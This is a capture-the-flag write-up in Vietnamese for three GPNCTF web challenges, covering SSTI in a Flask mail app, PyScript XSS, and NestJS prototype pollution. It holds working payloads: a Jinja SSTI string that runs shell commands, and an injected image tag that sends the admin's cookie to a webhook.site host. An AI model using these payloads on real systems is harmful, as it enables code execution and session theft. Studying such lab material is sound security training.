# **GPNCTF**

| Challenge-WEB     | FLAG|
| ----------- | ----------- |
| [**wanky_mail**](#web-wanky_mail) | `GPNCTF{n3v3r_trust_4ny_1nput_oiSdbwKI3a}`|
| [**cross-site-python**](#web-cross-site-python) | `GPNCTF{n3v3r_trust_4ny_1nput_oiSdbwKI3a}`|
| [**web-admin**](#web-admin) | `flag{d3m0Fl4g}`|

## **WEB-wanky_mail**

- Ở đây sau khi đọc source web chúng ta biết được trang web có chức năng tổng hợp những tin nhắn gửi đến eamil.

- Trang web được code bằng framework flask của python.

![](./IMG_CTF/Screenshot%202023-06-16%20210550.png)

- Và sau khi đọc soucer js ta biết được cứ sau 5s sẽ load lại 1 lần để check những tin nhắn gửi đến email.

```python
from flask import Flask, render_template_string, request, redirect, abort
from aiosmtpd.controller import Controller
from datetime import datetime
from base58 import b58decode, b58encode
import random 
import string
import os
from datetime import datetime
import queue

mails = {}
active_addr = queue.Queue(1000)

def format_email(sender, rcpt, body, timestamp, subject):
    return {"sender": sender, "rcpt": rcpt, 'body': body, 'subject': subject, "timestamp": timestamp}

def render_emails(address):
    id = 0
    render = """
    <table>
        <tr>
            <th id="th-left">From</th>
            <th>Subject</th>
            <th id="th-right">Date</th>
        </tr>
    """
    overlays = ""
    m = mails[address].copy()
    for email in m:

        render += f"""
        <tr id="{id}">
            <td>{email['sender']}</td>
            <td>{email['subject']}</td>
            <td>{email['timestamp']}</td>
        </tr>
        """
        overlays += f"""
        <div id="overlay-{id}" class="overlay">
            <div class="email-details">
                <h1>{email['subject']} - from: {email['sender']} to {email['rcpt']}</h1>
                <p>{email['body']}</p>
            </div>
        </div>
        """
        id +=1
    render += "</table>"
    render += overlays
    return render


def get_emails(id):
    with open('templates/index.html') as f:
        page = f.read()
        return page.replace('{{$}}', render_emails(id))

def log_email(session, envelope):
    print(f'{session.peer[0]} - - {repr(envelope.mail_from)}:{repr(envelope.rcpt_tos)}:{repr(envelope.content)}', flush=True)

def esc(s: str):
    return "{% raw %}" + s + "{% endraw %}"

class Handler:
     async def handle_RCPT(self, server, session, envelope, address, rcpt_options):
        if not address.endswith(os.environ.get('HOSTNAME')):
             return '550 not relaying to that domain'
        envelope.rcpt_tos.append(address)
        print(address, flush=True)
        return '250 OK'

     async def handle_DATA(self, server, session, envelope):
        m = format_email(esc(envelope.mail_from), envelope.rcpt_tos[0], esc(envelope.content.decode()), datetime.now().strftime("%d-%m-%Y, %H:%M:%S"), "PLACEHOLDER")
        log_email(session, envelope)
        r = envelope.rcpt_tos[0]
        if not mails.get(r):
            if active_addr.full():
                mails.pop(active_addr.get())
            mails[r] = []
            active_addr.put(r)
        if len(mails[r]) > 10:
            mails[r].pop(0)
        mails[r].append(m)
        return '250 OK'

c = Controller(Handler(), "0.0.0.0")
c.start()


app = Flask(__name__)
@app.route('/')
def index():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(12))
    address = f"{username}@{os.environ.get('HOSTNAME', 'example.com')}"
    if not address in mails.keys():
        if active_addr.full():
            del mails[active_addr.get()]
        mails[address] = []
        active_addr.put(address)
    id = b58encode(address).decode()
    return redirect("/" + id)

@app.route('/<id>')
def mailbox(id):
    address = b58decode(id).decode()
    if not address in mails.keys():
        abort(404)    
    return render_template_string(get_emails(address), address=address)

if __name__ == '__main__':
    app.run()
```

- `/id`: cho ta biết được địa chỉ id được mã hóa bằng base58, sau khi đi code id ta sẽ nhận được địa chỉ email của người nhận.

![](./IMG_CTF/Screenshot%202023-06-16%20211201.png)

- Chúng ta sẽ đi tìm hiểu `class Handler và handle_RCPT` là gì?

- [**aiosmtpd - An asyncio based SMTP server**](https://aiosmtpd.readthedocs.io/en/latest/controller.html)

- Thì tôi đã tìm hiểu được python có một thư viện để thực hiện giao tiếp SMTP. Sau khi đọc docs tôi đã biết cách gửi tin nhắn đến địa chỉ email..

```python
from smtplib import SMTP as Client
client = Client('webmail-0.chals.kitctf.de', 8025)
r = client.sendmail(
    "K@test.com", ['hzksrzyrabld@webmail-0.chals.kitctf.de'], "hello")
```

![](./IMG_CTF/Screenshot%202023-06-16%20211925.png)

- Đọc source ta biết trang web đã escape tất cả nội dung cũng như gmail người gửi bằng `{% raw %}`. Vậy tôi đã xác định được lỗ hổng ở đây là `SSTI` đồng thời đưa ra giải pháp bypass `{% raw %}` như sau:

```python

def esc(s: str):
    return "{% raw %}" + s + "{% endraw %}"

class Handler:
     async def handle_RCPT(self, server, session, envelope, address, rcpt_options):
        if not address.endswith(os.environ.get('HOSTNAME')):
             return '550 not relaying to that domain'
        envelope.rcpt_tos.append(address)
        print(address, flush=True)
        return '250 OK'

     async def handle_DATA(self, server, session, envelope):
        m = format_email(esc(envelope.mail_from), envelope.rcpt_tos[0], esc(envelope.content.decode()), datetime.now().strftime("%d-%m-%Y, %H:%M:%S"), "PLACEHOLDER")
        log_email(session, envelope)
        r = envelope.rcpt_tos[0]
        if not mails.get(r):
            if active_addr.full():
                mails.pop(active_addr.get())
            mails[r] = []
            active_addr.put(r)
        if len(mails[r]) > 10:
            mails[r].pop(0)
        mails[r].append(m)
        return '250 OK'
```

```python
from smtplib import SMTP as Client
client = Client('webmail-0.chals.kitctf.de', 8025)
ssti = '{% for x in ().__class__.__base__.__subclasses__() %}{% if \'warning\' in x.__name__ %}{{x()._module.__builtins__[\'__import__\'](\'os\').popen(\'cat flag-61150e68b7.txt\').read()}}{%endif%}{% endfor %}'
r = client.sendmail("\"{%endraw%} "+ssti+" {%raw%}\"@gamil.com",
                    ['jrjtumcfcyof@webmail-0.chals.kitctf.de'], "hello")
```

![](./IMG_CTF/Screenshot%202023-06-16%20212518.png)

## **WEB-cross-site-python**

- Ở bài này chúng ta có một trang web chức năng thực thi code python. Và đề bài cũng đã gợi ý cho chúng ta trang web này có lỗ hổng XSS và được code bằng python. Đề bài cho chúng ta 2 đường dẫn một đường dẫn admin và một đường dẫn bình thường thì việc chúng ta cần làm để admin nhấn vào đường link để lấy cookie-flag của admin.

- source-web:

```python
from flask import Flask, redirect, make_response, render_template, request, abort, Response
from base64 import b64decode as decode
from base64 import b64encode as encode
from queue import Queue
import random
import string

app = Flask(__name__)
projects  = {}
project_queue = Queue(1000)

def generate_id():
    return ''.join(random.choice(string.digits) for i in range(15))

@app.after_request
def add_csp(res):
    res.headers['Content-Security-Policy'] = "script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; base-uri 'none';"
    return res

@app.route('/')
def index():
    return redirect("/new")

@app.route("/new")
def new():
    if project_queue.full():
        projects.pop(project_queue.get())
    new_id = generate_id()
    while new_id in projects.keys():
        new_id = generate_id()
    projects[new_id] = 'print("Hello World!")'
    project_queue.put(new_id)
    return redirect(f"/{new_id}/edit")

@app.route("/<code_id>/edit")
def edit_page(code_id):
    if code_id not in projects.keys():
        abort(404)
    
    code = projects.get(code_id)
    return render_template("edit.html", code=code)

@app.route('/<code_id>/save', methods=["POST"])
def save_code(code_id):
    code = request.json["code"]
    projects[code_id] = code
    return {"status": "success"}

@app.route('/<code_id>/exec')
def code_page(code_id):
    if code_id not in projects.keys():
        abort(404)

    code = projects.get(code_id)

    # Genius filter to prevent xss
    blacklist = ["script", "img", "onerror", "alert"]
    for word in blacklist:
        if word in code:
            # XSS attempt detected!
            abort(403)

    res = make_response(render_template("code.html", code=code))
    return res


if __name__ == '__main__':
    app.run()

```

- Đọc source ta thấy trang web có sử dụng CSP để tất cả script đều nằm trong nguồn của trang web. Trang web còn có sử dụng filter để tránh việc XSS.

- Trang web đã sử dụng `Pyscript`, `PyScript` cung cấp một cách để bạn chạy mã Python trực tiếp trong trình duyệt của mình, giúp mọi người có khả năng lập trình mà không gặp rào cản về cơ sở hạ tầng.

- Nhưng tôi không thể làm các nào để import module vào được.

- Tôi đã thử tìm các phương thức class xem có phương thức nào có thể tấn công hay không. Bằng cách in ra `print(object.__subclasses__())`

```
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'ast.AST'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 'ast.NodeVisitor'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.Scanner'>, <class 'tokenize.Untokenizer'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'textwrap.TextWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'typing._Final'>, <class 'typing._Immutable'>, <class 'typing._NotIterable'>, typing.Any, <class 'typing._PickleUsingNameMixin'>, <class 'typing._BoundVarianceMixin'>, <class 'typing.Generic'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class '_pyodide._base.CodeRunner'>, <class 'importlib._abc.Loader'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'pathlib._Flavour'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_random.Random'>, <class '_sha512.sha384'>, <class '_sha512.sha512'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.TemporaryDirectory'>, <class 'importlib.resources.abc.ResourceReader'>, <class 'importlib.resources._adapters.SpecLoaderAdapter'>, <class 'importlib.resources._adapters.TraversableResourcesLoader'>, <class 'importlib.resources._adapters.CompatibilityFiles'>, <class 'importlib.abc.Finder'>, <class 'importlib.abc.MetaPathFinder'>, <class 'importlib.abc.PathEntryFinder'>, <class 'pyodide.ffi.JsProxy'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>, <class 'dis._Unknown'>, <class 'dis.Bytecode'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'concurrent.futures._base._Waiter'>, <class 'concurrent.futures._base._AcquireFutures'>, <class 'concurrent.futures._base.Future'>, <class 'concurrent.futures._base.Executor'>, <class 'select.poll'>, <class 'selectors.BaseSelector'>, <class '_socket.socket'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'asyncio.events.Handle'>, <class 'asyncio.events.AbstractServer'>, <class 'asyncio.events.AbstractEventLoop'>, <class 'asyncio.events.AbstractEventLoopPolicy'>, <class '_asyncio.FutureIter'>, <class 'TaskStepMethWrapper'>, <class '_RunningLoopHolder'>, <class '_asyncio.Future'>, <class 'asyncio.futures.Future'>, <class 'asyncio.protocols.BaseProtocol'>, <class 'asyncio.transports.BaseTransport'>, <class 'asyncio.mixins._LoopBoundMixin'>, <class 'asyncio.locks._ContextManagerMixin'>, <class 'asyncio.trsock.TransportSocket'>, <class 'asyncio.runners.Runner'>, <class 'asyncio.streams.StreamWriter'>, <class 'asyncio.streams.StreamReader'>, <class 'asyncio.subprocess.Process'>, <class 'asyncio.taskgroups.TaskGroup'>, <class 'asyncio.timeouts.Timeout'>, <class 'asyncio.unix_events.AbstractChildWatcher'>, <class 'pyodide.JsProxy'>, <class 'Buffer'>, <class 'FutureDoneCallback'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'tarfile._LowLevelFile'>, <class 'tarfile._Stream'>, <class 'tarfile._StreamProxy'>, <class 'tarfile._FileInFile'>, <class 'tarfile.TarInfo'>, <class 'tarfile.TarFile'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'zipfile.ZipInfo'>, <class 'zipfile.LZMACompressor'>, <class 'zipfile.LZMADecompressor'>, <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class 'email._policybase._PolicyBase'>, <class 'email.message.Message'>, <class 'importlib.metadata.Sectioned'>, <class 'importlib.metadata.DeprecatedTuple'>, <class 'importlib.metadata.Deprecated'>, <class 'importlib.metadata.FileHash'>, <class 'importlib.metadata.Distribution'>, <class 'importlib.metadata.DistributionFinder.Context'>, <class 'importlib.metadata.FastPath'>, <class 'importlib.metadata.Lookup'>, <class 'importlib.metadata.Prepared'>, <class 'pyscript.HTML'>, <class 'pyscript.Element'>, <class 'pyscript.PyWidgetTheme'>, <class 'pyscript.PyListTemplate'>, <class 'pyscript.Plugin'>]
```

- Thì tôi đã thấy `class 'pyscript.Element'` và tôi đã đi tìm hiểu về nó trong docs pyscript.

- [**class 'pyscript.Element'**](https://docs.pyscript.net/latest/reference/API/element.html)

- Tôi đã thực hiện payload sau khi đọc docs như sau:

```python
EL = object.__subclasses__()[363]("buttons")
EL.element.innerHTML= '<Img src="https://webhook.site/1cb4fd7d-da64-4b4f-9486-111e9de70d2e?'+EL.element.ownerDocument.cookie+'">'
```

![](./IMG_CTF/Screenshot%202023-06-17%20014549.png)

## **WEB-admin**

- Ở trang web này sau khi đăng nhập thành công chúng ta nhận được một token JWT:

![](./IMG_CTF/Screenshot%202023-07-05%20105844.png)

- Chúng ta sẽ đọc source và kiểm tra flag sẽ xuất phát từ đâu:

```javascript
import { Controller, Get, Query, UseGuards } from '@nestjs/common';
import { AppService } from './app.service';
import { IsAdminGuard } from './is-admin/is-admin.guard';
import { AuthGuard } from './auth/auth.guard';
import { ConfigService } from '@nestjs/config';

@Controller()
export class AppController {
  constructor(
    private readonly appService: AppService,
    private configService: ConfigService,
  ) {}

  @Get('/enableAttribute')
  enableAttribute(
    @Query('attribute') attribute: string,
    @Query('value') value: string,
  ): boolean {
    return this.appService.enableAttribute(attribute, value);
  }

  @Get('/disableAttribute')
  disableAttribute(
    @Query('attribute') attribute: string,
    @Query('value') value: string,
  ): boolean {
    return this.appService.disableAttribute(attribute, value);
  }

  @Get('/enabledAttributes')
  enabledAttributes(): any {
    return this.appService.getEnabledAttributeValues();
  }

  @Get('/flag')
  @UseGuards(AuthGuard, IsAdminGuard)
  getFlag(): string {
    return this.configService.get<string>('FLAG') || 'flag{d3m0Fl4g}';
  }
}
```

- Vậy flag sẽ được giấu `/flag`.Và để truy cập thành công chúng ta sẽ đi tìm hiểu `@UseGuards(AuthGuard, IsAdminGuard)`. Điều này có nghĩ phải đi qua 2 xác thực kia mới thành công nhận được flag

- `AuthGuard` có source như sau:

```javascript
import {
  CanActivate,
  ExecutionContext,
  Injectable,
  UnauthorizedException,
} from '@nestjs/common';
import { UserService } from 'src/user/user.service';

@Injectable()
export class AuthGuard implements CanActivate {
  constructor(private readonly userService: UserService) {}

  async canActivate(context: ExecutionContext): Promise<boolean> {
    const request = context.switchToHttp().getRequest();
    const token = this.extractTokenFromHeader(request);
    if (!token) {
      throw new UnauthorizedException();
    }
    try {
      const payload = await this.userService.validateJwt(token);
      // 💡 We're assigning the payload to the request object here
      // so that we can access it in our route handlers
      request['user'] = payload;
    } catch {
      throw new UnauthorizedException();
    }
    return true;
  }

  private extractTokenFromHeader(request: Request): string | undefined {
    const headers: any = request.headers;
    const [type, token] = headers.authorization?.split(' ') ?? [];
    return type === 'Bearer' ? token : undefined;
  }
}
// Chức năng đoạn source code này là sẽ lấy request gửi đến kiểm tra xem trong header request có token hay không nếu có nó sẽ trả về token hoặc undefined.
// Ví dụ một request như sau: 
//GET /flag HTTP/1.1
//Host: localhost:3000
//Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJncmVnZyIsInBhc3N3b3JkSGFzaCI6bnVsbCwiaXNBZG1pbiI6ZmFsc2UsImlhdCI6MTY4ODUyODc1MCwiZXhwIjoxNjg4NTI4ODcwfQ.wjAobRtjEtNn0RwRyTRZPY0NzhoU7wvKj5Qeud0J-Xk

// Sau khi xác thực xong payload sẽ được lưu vào request['user']
```

- Chúng ta đi đến tìm hiểu source `IsAdminGuard`:

```javascript
import { CanActivate, ExecutionContext, Injectable } from '@nestjs/common';
import { Observable } from 'rxjs';

@Injectable()
export class IsAdminGuard implements CanActivate {
  canActivate(
    context: ExecutionContext,
  ): boolean | Promise<boolean> | Observable<boolean> {
    const { user } = context.switchToHttp().getRequest();
    const adminUser: { isAdmin?: boolean } = {};
    if (user?.isAdmin) {
      adminUser.isAdmin = true;
    }
    if (adminUser.isAdmin) {
      return true;
    }
    return false;
  }
}
// Ở đây nó sẽ xác minh trong payload jwt sau khi được xác thực xong user.isAdin có true hay không nếu nó là true thì adminUser.isAdmin = true;
```

![](./IMG_CTF/Screenshot%202023-07-05%20112115.png)

- `adminUser.isAdmin` chúng ta sẽ chỉ quan tâm đến điều này vì nó là mấu chốt `IsAdminGuard`. Từ đấy, ta nhìn thầy rằng ở đây chúng ta có thể tấn công prototype pollution bằng cách như sau, và có thể bypass được `adminUser.isAdmin = true`.

- Chung ta quan sát trang web có chức năng tắt bật đèn giao thông và ở đây nó tắt bật đèn bằng thuộc tính :

```javascript
import { Controller, Get, Query, UseGuards } from '@nestjs/common';
import { AppService } from './app.service';
import { IsAdminGuard } from './is-admin/is-admin.guard';
import { AuthGuard } from './auth/auth.guard';
import { ConfigService } from '@nestjs/config';

@Controller()
export class AppController {
  constructor(
    private readonly appService: AppService,
    private configService: ConfigService,
  ) {}

  @Get('/enableAttribute')
  enableAttribute(
    @Query('attribute') attribute: string,
    @Query('value') value: string,
  ): boolean {
    return this.appService.enableAttribute(attribute, value);
  }

  @Get('/disableAttribute')
  disableAttribute(
    @Query('attribute') attribute: string,
    @Query('value') value: string,
  ): boolean {
    return this.appService.disableAttribute(attribute, value);
  }

  @Get('/enabledAttributes')
  enabledAttributes(): any {
    return this.appService.getEnabledAttributeValues();
  }

  @Get('/flag')
  @UseGuards(AuthGuard, IsAdminGuard)
  getFlag(): string {
    return this.configService.get<string>('FLAG') || 'flag{d3m0Fl4g}';
  }
}
-----------------------------------------------------------------------------------------------------------
import { Injectable } from '@nestjs/common';

@Injectable()
export class AppService {
  enabledAttributeValues: any;
  constructor() {
    this.enabledAttributeValues = {};
  }

  enableAttribute(attribute: string, value: string): boolean {
    if (!this.enabledAttributeValues[attribute]) {
      this.enabledAttributeValues[attribute] = {};
    }
    this.enabledAttributeValues[attribute][value] = true;

    return true;
  }

  disableAttribute(attribute: string, value: string): boolean {
    if (!this.enabledAttributeValues[attribute]) {
      this.enabledAttributeValues[attribute] = {};
    }
    this.enabledAttributeValues[attribute][value] = false;

    return true;
  }

  getEnabledAttributeValues(): any {
    return this.enabledAttributeValues;
  }
}
```

![](./IMG_CTF/Screenshot%202023-07-05%20112333.png)

- Đèn giao thông sẽ được bật sau khi gửi thuộc tính đến `/enableAttribute`
- Từ đây, chúng ta có thể tấn công bằng prototype, và thành công bypass xác thực admin để lấy flag như sau:

![](./IMG_CTF/Screenshot%202023-07-05%20112544.png)

![](./IMG_CTF/Screenshot%202023-07-05%20112723.png)
